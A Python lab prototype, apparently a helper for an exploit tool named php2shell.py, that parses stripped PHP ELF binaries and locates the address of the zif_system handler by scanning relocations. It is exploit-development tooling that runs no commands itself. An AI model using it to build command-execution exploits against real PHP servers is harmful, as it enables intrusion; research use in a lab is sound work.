#!/usr/bin/env python3
"""elfsyms.py — zif_system extraction from stripped PHP binaries via
R_X86_64_RELATIVE relocation scanning (lab prototype for php2shell.py).

Method: find the zend_function_entry for "system" in .data.rel.ro by
locating the RELA entry whose addend == vaddr("system\\0") and taking the
next entry's addend (the handler pointer = zif_system). Cross-validate with
the "exec" entry (zif_exec is adjacent in exec.c) and the .text range.
"""
import struct
import sys

SHT_RELA = 4
SHT_PROGBITS = 1


def parse_elf(path):
    with open(path, "rb") as f:
        data = f.read()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("not ELF64 LE")
    (e_shoff, e_shentsize, e_shnum, e_shstrndx) = struct.unpack_from("<Q", data, 0x28)[0], \
        struct.unpack_from("<H", data, 0x3A)[0], struct.unpack_from("<H", data, 0x3C)[0], \
        struct.unpack_from("<H", data, 0x3E)[0]
    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        (sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size,
         sh_link, sh_info, sh_align, sh_entsize) = struct.unpack_from("<IIQQQQIIQQ", data, off)
        sections.append({"name_off": sh_name, "type": sh_type, "flags": sh_flags,
                         "addr": sh_addr, "offset": sh_offset, "size": sh_size,
                         "entsize": sh_entsize})
    # section names
    shstr = sections[e_shstrndx]
    def secname(s):
        end = data.index(b"\x00", shstr["offset"] + s["name_off"])
        return data[shstr["offset"] + s["name_off"]:end].decode()
    for s in sections:
        s["name"] = secname(s)
    return data, sections


def find_strings(data, sections, needle):
    """vaddrs of needle bytes in alloc'd PROGBITS sections (.rodata etc)."""
    out = []
    for s in sections:
        if s["type"] != SHT_PROGBITS or not (s["flags"] & 0x2):  # SHF_ALLOC
            continue
        blob = data[s["offset"]:s["offset"] + s["size"]]
        start = 0
        while True:
            i = blob.find(needle, start)
            if i < 0:
                break
            out.append(s["addr"] + i)
            start = i + 1
    return out


def rela_entries(data, sections):
    """sorted [(r_offset, addend)] for R_X86_64_RELATIVE (type 8)."""
    out = []
    for s in sections:
        if s["type"] != SHT_RELA:
            continue
        n = s["size"] // 24
        for i in range(n):
            r_offset, r_info, r_addend = struct.unpack_from("<QQq", data, s["offset"] + i * 24)
            if (r_info & 0xFFFFFFFF) == 8:  # R_X86_64_RELATIVE
                out.append((r_offset, r_addend))
    out.sort()
    return out


def text_range(sections):
    for s in sections:
        if s["name"] == ".text":
            return s["addr"], s["addr"] + s["size"]
    return None


def candidates_for(data, sections, relas, text, name):
    """ALL handler addresses whose zend_function_entry.fname == vaddr(name\\0)
    with a .text handler in the following relocation slot."""
    t0, t1 = text
    out = []
    for sv in find_strings(data, sections, name.encode() + b"\x00"):
        for idx, (roff, addend) in enumerate(relas):
            if addend == sv:
                if idx + 1 < len(relas):
                    h = relas[idx + 1][1]
                    if t0 <= h < t1:
                        out.append(h)
                        break
    return out


def find_zif_system(path, verbose=False):
    data, sections = parse_elf(path)
    text = text_range(sections)
    relas = rela_entries(data, sections)
    if verbose:
        print(f"[*] {path}: {len(relas)} RELATIVE relocs, .text=0x{text[0]:x}-0x{text[1]:x}")
    sys_c = candidates_for(data, sections, relas, text, "system")
    exe_c = candidates_for(data, sections, relas, text, "exec")
    pass_c = candidates_for(data, sections, relas, text, "passthru")
    shel_c = candidates_for(data, sections, relas, text, "shell_exec")
    if verbose:
        print(f"[*] candidates: system={[hex(x) for x in sys_c]} exec={[hex(x) for x in exe_c]}")
    if not sys_c:
        return None
    validated = []
    for s in sys_c:
        exe_ok = any(abs(s - e) <= 0x40 for e in exe_c)
        pass_ok = any(abs(s - p) <= 0x200 for p in pass_c)
        shel_ok = any(abs(s - h) <= 0x200 for h in shel_c)
        score = (1 if exe_ok else 0) + (1 if pass_ok else 0) + (1 if shel_ok else 0)
        if score:
            validated.append((score, s))
    if validated:
        validated.sort(reverse=True)
        best_score, best = validated[0]
        if verbose:
            print(f"[*] validated (score {best_score}/3): zif_system=0x{best:x}")
        return best
    if verbose:
        print("[!] no canary pair — returning first candidate UNVALIDATED")
    return sys_c[0]


if __name__ == "__main__":
    for p in sys.argv[1:]:
        off = find_zif_system(p, verbose=True)
        print(f"RESULT {p}: zif_system = {hex(off) if off else 'NOT FOUND'}")
